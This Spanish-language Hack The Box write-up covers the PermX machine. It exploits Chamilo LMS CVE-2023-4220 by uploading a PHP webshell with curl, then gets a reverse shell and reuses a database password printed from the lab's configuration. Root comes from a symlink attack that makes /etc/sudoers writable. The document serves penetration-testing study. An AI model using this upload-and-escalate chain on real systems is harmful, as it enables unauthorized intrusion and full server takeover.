---
title: PermX
description: HTB PermX machine writeup – Chamilo LMS file upload RCE and ACL-based sudo privilege escalation
tags:
  - hackthebox
  - linux
  - chamilo
  - file-upload
  - rce
  - sudo
  - acl
  - privesc
difficulty: easy
platform: hackthebox
os: linux
vector: file-upload
author: fmol107
---


![](./img/permx.png)
# [PermX](https://www.hackthebox.com/machines/PermX)

> Linux · Easy · Hack The Box

---

## 1. Basic Information

- **Machine name:** PermX  
- **Platform:** Hack The Box  
- **IP:** 10.129.61.184  
- **Operating System:** Ubuntu Linux  
- **Difficulty:** Easy  
- **Primary attack vector:** Unrestricted file upload (Chamilo LMS)  
- **Initial access:** Remote Code Execution as `www-data`  
- **Privilege escalation:** ACL abuse via misconfigured sudo script  
- **Date:** 2026-01-29  

---

## 2. Summary

PermX expone un portal e-learning basado en **Chamilo LMS** vulnerable a una subida de archivos arbitrarios sin autenticación (**CVE-2023-4220**), lo que permite obtener ejecución remota de comandos como **www-data**.  
A partir de credenciales reutilizadas encontradas en la configuración de la aplicación, se accede a un usuario local con permisos `sudo` sobre un script que gestiona **ACLs**, el cual puede abusarse mediante un **symlink attack** para escalar privilegios hasta **root**.

---

## 3. Enumeration

### 3.1 Network discovery (Nmap)

Se realiza un escaneo completo de puertos TCP para identificar la superficie de ataque, seguido de un escaneo de versiones sobre los puertos abiertos.

#### 3.1.1 Full port scan (TCP)

```bash
nmap -sS -p- -Pn -n --min-rate 5000 -vvv -oN iniScanPermx.txt 10.129.61.184

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
````

#### 3.1.2 Service/version scan

```bash
nmap -sCV -p22,80 -Pn -n -vvv -oN verScanPermx.txt 10.129.61.184
```

Resultados relevantes:

- **SSH:** OpenSSH 8.9p1
- **HTTP:** Apache 2.4.52 con redirección a `permx.htb`

Se añade el dominio al fichero de hosts:

```bash
echo "10.129.61.184 permx.htb" | sudo tee -a /etc/hosts
```

---

### 3.2 HTTP – permx.htb

Enumeración inicial del servicio web:

```bash
whatweb http://permx.htb
```

El sitio corresponde a un portal corporativo estático sin funcionalidad relevante.

[http://permx.htb/](http://permx.htb/)

![](./img/web_permx.png)

Se realiza fuerza bruta de directorios sin resultados críticos.

---

### 3.3 Virtual hosts discovery

Dado que el servidor responde por nombre, se enumeran **virtual hosts** mediante fuzzing del header `Host`.

```bash
ffuf -c -fc 302,404 -t 200 \
-w directory-list-2.3-medium.txt \
-u http://permx.htb/ \
-H "Host: FUZZ.permx.htb"
```

Se identifican los siguientes subdominios:

- `www.permx.htb`
- **`lms.permx.htb`**

Se añaden al fichero de hosts:

```bash
echo "10.129.61.184 www.permx.htb lms.permx.htb" | sudo tee -a /etc/hosts
```

---

### 3.4 HTTP – lms.permx.htb (Chamilo LMS)

```bash
whatweb http://lms.permx.htb
```

Resultados clave:

- **Chamilo LMS 1.11.x**
- Portal de e-learning accesible
- README expuesto

[http://lms.permx.htb/](http://lms.permx.htb/)

![](./img/web_chamilo.png)

Enumeración de rutas revela una estructura típica de Chamilo, incluyendo ficheros de configuración y documentación.

```bash
dirsearch -u http://lms.permx.htb/
```

El archivo `README.md` confirma la versión vulnerable.

---

## 4. Foothold

### 4.1 CVE-2023-4220 – Unrestricted File Upload

Chamilo LMS ≤ **1.11.24** es vulnerable a una subida de archivos arbitrarios sin autenticación en:

```
/main/inc/lib/javascript/bigupload/inc/bigUpload.php
```

Esto permite subir archivos PHP directamente accesibles desde el servidor web.

#### Prueba de ejecución remota

```bash
echo '<?php system("id"); ?>' > rce.php
```

Subida del archivo:

```bash
curl -F 'bigUploadFile=@rce.php' \
'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
```

Ejecución:

```bash
curl http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce.php
```

Resultado:

```
uid=33(www-data) gid=33(www-data)
```

---

### 4.2 Reverse shell

Se sube una reverse shell en PHP y se inicia un listener local.

```bash
nc -nlvp 4444
```

Al acceder al archivo subido se obtiene una shell como **www-data**:

![](./img/Pasted%20image%2020260129223805.png)

---

### 4.3 Credenciales reutilizadas

En el fichero de configuración de Chamilo:

```
/var/www/chamilo/app/config/configuration.php
```

Se encuentran las credenciales de base de datos:

```php
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
```

Revisando `/etc/passwd` se identifica un usuario local válido:

- **mtz (uid 1000)**

Las credenciales son reutilizadas con éxito:

```
mtz : 03F6lY3uXAP2bkW8
```

---

## 5. Privilege Escalation

### 5.1 Sudo enumeration

```bash
sudo -l
```

Resultado:

```
(ALL : ALL) NOPASSWD: /opt/acl.sh
```

---

### 5.2 Análisis del script ACL

```bash
cat /opt/acl.sh
```

El script:

- Permite modificar ACLs mediante `setfacl`
- Restringe la ruta a `/home/mtz/*`
- **No valida enlaces simbólicos**

Esto permite apuntar a ficheros sensibles fuera del directorio permitido.

---

### 5.3 Symlink attack sobre sudoers

Se crea un enlace simbólico a `/etc/sudoers`:

```bash
ln -s /etc/sudoers /home/mtz/sudoers
```

Se modifican los permisos vía el script con sudo:

```bash
sudo /opt/acl.sh mtz rwx /home/mtz/sudoers
```

El fichero sudoers queda editable por el usuario.

Se añade:

```text
mtz ALL=(ALL) NOPASSWD:ALL
```

---

### 5.4 Root shell

```bash
sudo su
```

Acceso root obtenido.

---

## 6. Conclusion

PermX es una máquina **easy** muy representativa de escenarios reales, combinando:

- Vulnerabilidad web crítica en software popular (**Chamilo LMS**)
- Reutilización de credenciales
- Escalada de privilegios mediante **ACLs mal gestionadas y sudo**

La explotación no requiere técnicas avanzadas, sino una correcta **enumeración y encadenamiento de fallos**.

---

## References

- [https://nvd.nist.gov/vuln/detail/CVE-2023-4220](https://nvd.nist.gov/vuln/detail/CVE-2023-4220)
- [https://starlabs.sg/advisories/23/23-4220/](https://starlabs.sg/advisories/23/23-4220/)
- [https://gtfobins.org/gtfobins/setfacl/](https://gtfobins.org/gtfobins/setfacl/)
- [https://0xdf.gitlab.io/2024/11/02/htb-permx.html](https://0xdf.gitlab.io/2024/11/02/htb-permx.html)